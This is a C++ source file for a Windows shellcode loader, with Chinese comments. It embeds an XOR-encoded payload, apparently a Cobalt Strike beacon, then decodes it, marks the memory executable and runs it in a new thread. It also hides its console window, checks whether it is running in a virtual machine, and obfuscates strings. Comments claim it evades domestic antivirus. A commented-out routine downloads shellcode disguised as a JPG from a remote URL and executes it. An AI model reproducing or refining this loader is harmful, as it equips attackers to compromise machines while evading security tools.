#if 0
#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <string.h>
#include "B:\Developers\vcpkg\installed\x86-windows\include\curl\curl.h"
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"wldap32.lib")
#pragma comment(lib,"libcurl.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment  (lib,"User32.lib")
#pragma comment  (lib,"Gdi32.lib")
#define CRYPT8(str) { CRYPT8_(str"\0\0\0\0\0\0\0\0") }
#define CRYPT8_(str) (str)[0] + 1, (str)[1] + 2, (str)[2] + 3, (str)[3] + 4, (str)[4] + 5, (str)[5] + 6, (str)[6] + 7, (str)[7] + 8, '\0'
// calling it
const char str[] = CRYPT8("ntdll");
#define XorString( String ) ( CXorString<ConstructIndexList<sizeof( String ) - 1>::Result>( String ).decrypt() )
using namespace std;
//国内全过，国外卡巴斯暂时基过不了
void HideWindow() {
    HWND hwnd = GetForegroundWindow();
    if (hwnd) {
        ShowWindow(hwnd, SW_HIDE);
    }
}

bool IsVirtualPC()//反nod32查杀
{
    __try
    {
        __asm
        {
            mov eax, 1
            _emit 0x0F
            _emit 0x3F
            _emit 0x07
            _emit 0x0B
            _emit 0xC7
            _emit 0x45
            _emit 0xFC
            _emit 0xFF
            _emit 0xFF
            _emit 0xFF
            _emit 0xFF
        }
    }
    __except (1)
    {
        return FALSE;
    }
    return TRUE;
}

bool mainHeaderIs()
{
    HKEY ck;
    char strreg[] = { 'S','O','F','T','W','A','R','E','\\','O','D','B','C','\0' };
    if (ERROR_SUCCESS != RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCTSTR)strreg, 0, KEY_ALL_ACCESS, &ck))
    {
        return FALSE;
    }
    return TRUE;
}

string get_cipher(const string& url)
{
    string cipher = "";
    CURL* curl;
    CURLcode res;
    string data;
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
        res = curl_easy_perform(curl);
        cipher = data;
        curl_easy_cleanup(curl);
    }
    return cipher;
}

//void call_masm()
//{
//    string url = "http://test.com/xx.jpg";
//    string cipher = get_cipher(url);
//    //std::cout << cipher << std::endl;
//    if (cipher.length() > 0) {
//        string deStr = cipher;
//        //string deStr = DecryptionAES(cipher);
//        void* pMessage = (char*)deStr.c_str();
//        unsigned long len_message = deStr.length();
//        void* Memory = VirtualAlloc(NULL, sizeof(pMessage) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
//        ZeroMemory(Memory, len_message + 1);
//        memcpy(Memory, pMessage, len_message);
//        //((void(*)())Memory)();
//        __asm {
//            mov eax, dword ptr Memory
//            call eax;
//        }
//
//    };
//}

// 入口函数
int main(int argc, TCHAR* argv[]) {
    if (IsVirtualPC()) {
        printf("VirtualPC");
        return 0;
    }
    //if (mainHeaderIs) {
    //    printf("MainHeader");
    //    return 0;
    //}
    //隐藏窗口运行
    HideWindow();
    int codeRandom_size = 0; // shellcode长度
    DWORD dwThreadIdSID; // 线程ID
    HANDLE hShellThread; // 线程句柄
    DWORD dwOldProtect;
    /* length: 800 bytes */
    char CSServerCcode[] = "\x77\x63\x02\x8b\x8b\x8b\xeb\x02\x6e\xba\x59\xef\x00\xd9\xbb\x00\xd9\x87\x00\xd9\x9f\x00\xf9\xa3\x84\x3c\xc1\xad\xba\x74\xba\x4b\x27\xb7\xea\xf7\x89\xa7\xab\x4a\x44\x86\x8a\x4c\x69\x7b\xd9\xdc\x00\xd9\x9b\x00\xc9\xb7\x8a\x5b\x00\xcb\xf3\x0e\x4b\xff\xc1\x8a\x5b\xdb\x00\xc3\x93\x00\xd3\xab\x8a\x58\x68\xb7\xc2\x00\xbf\x00\x8a\x5d\xba\x74\xba\x4b\x27\x4a\x44\x86\x8a\x4c\xb3\x6b\xfe\x7f\x88\xf6\x73\xb0\xf6\xaf\xfe\x69\xd3\x00\xd3\xaf\x8a\x58\xed\x00\x87\xc0\x00\xd3\x97\x8a\x58\x00\x8f\x00\x8a\x5b\x02\xcf\xaf\xaf\xd0\xd0\xea\xd2\xd1\xda\x74\x6b\xd3\xd4\xd1\x00\x99\x60\x0d\xd6\xe3\xe5\xee\xff\x8b\xe3\xfc\xe2\xe5\xe2\xdf\xe3\xc7\xfc\xad\x8c\x74\x5e\x63\x8b\x8b\x8b\x8b\xba\x74\xdc\xdc\xdc\xdc\xdc\xe3\xb1\xdd\xf2\x2c\x74\x5e\x62\x2f\x8b\x8b\x8b\xd0\xba\x42\xda\xda\xe1\x88\xda\xda\xe3\x30\x8a\x8b\x8b\xd8\xdb\xe3\xdc\x02\x14\x4d\x74\x5e\xdb\x62\x07\x8b\x8b\x8b\xd0\xba\x59\xd9\xe3\x8b\xb9\x4b\x0f\xd9\xd9\xd9\xd8\xd9\xdb\xe3\x60\xde\xa5\xb0\x74\x5e\x02\x4d\x08\x48\xdb\xe3\x0b\xb8\x8b\x8b\x02\x6b\xe1\x8f\xdb\xe1\x94\xdd\xe3\xfe\xcd\x15\x0d\x74\x5e\xd4\xba\x74\xdc\xdc\xe1\x74\xd8\xdd\xe3\xa6\x8d\x93\xf0\x74\x5e\x0e\x4b\x84\x0f\x41\x8a\x8b\x8b\xba\x74\x0e\x7d\xff\x8f\x02\x72\x60\x82\xe3\x21\x4e\x69\xd6\x74\x5e\x02\x4a\xe3\xce\xaa\xd5\xba\x74\x5e\xba\x74\xdc\xe1\x8c\xda\xdd\xdb\xe3\x3c\xdc\x6b\x80\x74\x5e\x34\x8b\xa4\x8b\x8b\xb2\x4c\xfe\x8c\xd3\xdb\x62\xf0\x74\x74\x74\xba\x74\x62\x1a\x8a\x8b\x8b\x62\x42\x8a\x8b\x8b\x63\xe4\x74\x74\x74\xa4\xf8\xff\xea\xff\xe2\xe8\xa6\xef\xe2\xf9\xee\xe8\xff\xe4\xf9\xf2\xa4\xe6\xe4\xe9\xe2\xe7\xee\xa6\xe2\xfb\xea\xef\xa6\xe3\xe4\xe6\xee\xa5\xe1\xfb\xec\x8b\xc6\x38\xef\x71\x80\x3f\xd6\xb7\x61\xb6\x48\xf9\x09\x37\x53\x9c\x5e\xfa\x8c\x12\x89\x9a\x3b\x12\xe5\x01\x83\x2c\xbd\x8b\xc4\x0c\xab\xaa\x0d\x73\x0f\xe1\x55\x2d\x8b\xc3\xe4\xf8\xff\xb1\xab\xef\xbc\xba\xed\xbc\xea\xed\xbf\xa5\xe0\xe2\xe5\xec\xe7\xf2\xb3\xb3\xa5\xe8\xe4\xe6\x86\x81\xc8\xe4\xe5\xe5\xee\xe8\xff\xe2\xe4\xe5\xb1\xab\xe8\xe7\xe4\xf8\xee\x86\x81\xca\xe8\xe8\xee\xfb\xff\xb1\xab\xe2\xe6\xea\xec\xee\xa4\xa1\x86\x81\xca\xe8\xe8\xee\xfb\xff\xa6\xce\xe5\xe8\xe4\xef\xe2\xe5\xec\xb1\xab\xec\xf1\xe2\xfb\x86\x81\xde\xf8\xee\xf9\xa6\xca\xec\xee\xe5\xff\xb1\xab\xc6\xe4\xf1\xe2\xe7\xe7\xea\xa4\xbe\xa5\xbb\xab\xa3\xdc\xe2\xe5\xef\xe4\xfc\xf8\xab\xdb\xe3\xe4\xe5\xee\xab\xba\xbb\xa5\xbb\xb0\xab\xca\xe5\xef\xf9\xe4\xe2\xef\xab\xbd\xa5\xbb\xa5\xba\xb0\xab\xc6\xe2\xe8\xf9\xe4\xf8\xe4\xed\xff\xb0\xab\xd9\xc6\xa6\xba\xba\xbe\xb9\xa2\xab\xca\xfb\xfb\xe7\xee\xdc\xee\xe9\xc0\xe2\xff\xa4\xbe\xb8\xbc\xa5\xb8\xbd\xab\xa3\xc0\xc3\xdf\xc6\xc7\xa7\xab\xe7\xe2\xe0\xee\xab\xcc\xee\xe8\xe0\xe3\xa2\x86\x81\x8b\x27\x70\x32\x6c\x1f\x6d\xcd\x8c\x3f\x30\xe1\xf6\xf1\x81\x79\xb2\xae\xaf\xe9\x0f\x6d\x28\x38\x4d\xee\x9e\xa3\x6f\x98\x1f\x37\xa3\xf4\xc7\x79\x91\x77\xbe\xa2\xce\x04\xc4\x32\x4e\x2a\x80\x20\x11\x04\x9f\x44\xac\xca\xde\xcf\xb2\xe6\xf4\x7d\xfc\x44\xb5\x44\xa0\xad\x9d\xae\x49\xf2\x32\xb1\x9f\xf8\xe0\x9d\x27\xa0\x4d\x29\x7d\x5b\x48\xe9\x75\xad\xb9\xdd\xf7\xef\xd3\xd7\x62\x82\x1b\x8b\xe3\x7b\x3e\x29\xdd\x74\x5e\xe1\xcb\xe3\x8b\x9b\x8b\x8b\xe3\x8b\x8b\xcb\x8b\xdc\xe3\xd3\x2f\xd8\x6e\x74\x5e\x18\x32\x8b\x8b\x8b\x8b\x8a\x52\xda\xd8\x02\x6c\xdc\xe3\x8b\xab\x8b\x8b\xd8\xdd\xe3\x99\x1d\x02\x69\x74\x5e\x0e\x4b\xff\x4d\x00\x8c\x8a\x48\x0e\x4b\xfe\x6e\xd3\x48\x63\x02\x76\x74\x74\xef\xbc\xba\xed\xbc\xea\xed\xbf\xa5\xe0\xe2\xe5\xec\xe7\xf2\xb3\xb3\xa5\xe8\xe4\xe6\x8b\x92\xe2\x2b\x06";
    // 获取shellcode大小
    codeRandom_size = sizeof(CSServerCcode);
    for (int i = 0; i < codeRandom_size; i++) {
        //_InterlockedXor8(code + i, 235);
        CSServerCcode[i] ^= 139;
    }
    try
    {
        char* codeMem = (char*)VirtualAlloc(
            NULL,
            codeRandom_size,
            MEM_COMMIT,
            //PAGE_EXECUTE // 只申请可执行
            PAGE_READWRITE // 只申请可读可写
        );
        // 将shellcode复制到可执行的内存页中
        //MecpyAsSystem(codeMem, CSServerCcode, codeRandom_size);
        memcpy(codeMem, CSServerCcode, codeRandom_size);
        // 这里开始更改它的属性为可执行
        VirtualProtect(codeMem, codeRandom_size, PAGE_EXECUTE, &dwOldProtect);
        Sleep(300);
        // 创建线程
        hShellThread = CreateThread(
            NULL, // 安全描述符
            NULL, // 栈的大小
            (LPTHREAD_START_ROUTINE)codeMem, // 函数
            NULL, // 参数
            NULL, // 线程标志
            &dwThreadIdSID // 线程ID
        );
        //hShellThread = NULL;
        WaitForSingleObject(hShellThread, INFINITE); // 一直等待线程执行结束
    }
    catch (const char*& e)
    {
        printf("123");
    }
    ExitProcess(0);
    return 0;
}
#endif // 0
